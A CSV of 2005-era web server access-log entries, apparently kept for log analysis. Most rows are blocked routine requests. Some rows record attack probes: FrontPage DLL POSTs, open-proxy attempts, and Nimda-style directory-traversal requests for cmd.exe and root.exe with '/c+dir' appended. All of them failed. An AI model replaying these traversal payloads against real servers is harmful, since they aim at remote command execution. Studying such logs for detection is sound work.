,Epoch Date,Log Type,IP Adress,Log
0,1110686747,access_log,210.116.59.164," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
1,1110686792,access_log,210.116.59.164," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
2,1110686839,access_log,210.116.59.164," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
3,1110686891,access_log,210.116.59.164," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
4,1110686940,access_log,210.116.59.164," ""POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1"" 404 1063 ""-"" ""-"""
5,1110687018,access_log,211.141.115.145," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
6,1110701007,access_log,66.30.71.74," ""GET /scripts/nsiislog.dll HTTP/1.1"" 404 1050 ""-"" ""-"""
7,1110710171,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
8,1110710171,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
9,1110710171,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
10,1110710171,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
11,1110710171,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
12,1110710171,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
13,1110710171,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
14,1110710172,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
15,1110710172,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
16,1110710172,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
17,1110710172,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
18,1110710172,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
19,1110710172,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
20,1110710173,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
21,1110710173,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
22,1110710173,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
23,1110710173,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
24,1110710174,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
25,1110710174,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
26,1110710174,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
27,1110710174,access_log,218.1.111.50," ""GET http://www.yahoo.com/ HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)"""
28,1110712918,access_log,66.131.126.31," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
29,1110714119,access_log,69.158.7.209," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
30,1110719133,access_log,213.129.21.137," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
31,1110721694,access_log,24.23.244.160," ""GET /scripts/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
32,1110721696,access_log,24.23.244.160," ""GET /MSADC/root.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
33,1110721698,access_log,24.23.244.160," ""GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
34,1110721700,access_log,24.23.244.160," ""GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
35,1110721702,access_log,24.23.244.160," ""GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
36,1110721704,access_log,24.23.244.160," ""GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
37,1110721706,access_log,24.23.244.160," ""GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
38,1110721708,access_log,24.23.244.160," ""GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
39,1110721709,access_log,24.23.244.160," ""GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
40,1110721711,access_log,24.23.244.160," ""GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
41,1110721712,access_log,24.23.244.160," ""GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
42,1110721715,access_log,24.23.244.160," ""GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
43,1110721716,access_log,24.23.244.160," ""GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
44,1110721718,access_log,24.23.244.160," ""GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 400 974 ""-"" ""-"""
45,1110721720,access_log,24.23.244.160," ""GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
46,1110721722,access_log,24.23.244.160," ""GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0"" 404 1041 ""-"" ""-"""
47,1110726164,access_log,24.130.169.87," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
48,1110729667,access_log,221.237.66.208," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
49,1110735346,access_log,208.46.133.177," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
50,1110737151,access_log,218.88.202.208," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
51,1110738445,access_log,219.186.156.26," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
52,1110744972,access_log,65.202.33.226," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
53,1110749098,access_log,208.39.169.124," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
54,1110751905,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
55,1110751905,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
56,1110751905,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
57,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
58,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
59,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
60,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
61,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
62,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
63,1110751906,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
64,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
65,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
66,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
67,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
68,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
69,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
70,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
71,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
72,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
73,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
74,1110751907,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
75,1110751908,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
76,1110751908,access_log,220.110.29.27," ""GET / HTTP/1.1"" 400 308 ""-"" ""-"""
77,1110753511,access_log,61.205.6.71," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
78,1110758852,access_log,68.191.137.235," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
79,1110768521,access_log,157.91.44.1," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
80,1110773466,access_log,209.213.220.227," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
81,1110775614,access_log,218.201.121.99," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
82,1110783205,access_log,222.166.160.63," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
83,1110789835,access_log,66.21.127.198," ""GET / HTTP/1.1"" 403 2898 ""-"" ""Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"""
